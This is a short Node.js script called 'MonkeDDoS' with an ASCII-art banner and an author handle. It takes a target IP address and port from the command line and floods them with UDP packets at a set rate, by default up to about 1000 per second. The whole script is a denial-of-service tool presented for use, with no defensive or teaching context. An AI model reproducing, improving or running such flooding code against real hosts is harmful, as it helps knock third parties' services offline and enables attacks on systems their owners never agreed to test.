const dgram = require('dgram');

const client = dgram.createSocket('udp4');

const args = process.argv;

const address = args[2]

const port = args[3]

const times = args[4] ?? 1000

if(!address || !port)

  return console.log(`

..................................................

..................................................

..................................................

..................................................

.....................................''''''.......

.....................................''''''.......

....';;;;;;;;;;;;,............,;;;;;;::::::,......

'''';ddddddddddddl............:ddddddddddddc.....'

'''';ddddddddddddl............:ddddddddddddc.....'

....;ddddddkOOOOOd,,,,,,;;;;;;lOOOOOOxdddddc.....'

....,ddddddNMMMMMXdddddddddddd0MMMMMMkdddddc......

....,ddddddNMMMMMXdddddddddddd0MMMMMMkdddddc.....'

....,dddddd0KKKKKOooooooooooooxKKKKKKxdddddc.....'

....;dddddd.     .;;;;;;;;;;;;.      ldddddc.....'

....;dddddd.     .;;;;;;;;;;;;.      ldddddc.....'

,,,,cxxxxxx'.....'cccccccccccc,......oxxxxxl,,,,,;

OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkkkkkx

OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkkkkkx

OOOOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx

0000d......................................:00000O

0000d......................................:00000O

0000d......................................:00000O

OOOOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOk

OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOk

OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOk

--------MonkeDDoS ----> Version 1.0 BETA-------- \n -------Author: id4l#2978-----------

  `);

client.on('error', (e) => {

  console.log('[ERROR]: ' + e)

  process.kill(process.pid);

})

setInterval(() => {

    client.send('', 0, 0, port, address);

    console.log(`[MonkeDDoS] Sending packets to ${address}:${port}...`)

}, (1000 / (times <= 0 ? 1000 : times)))
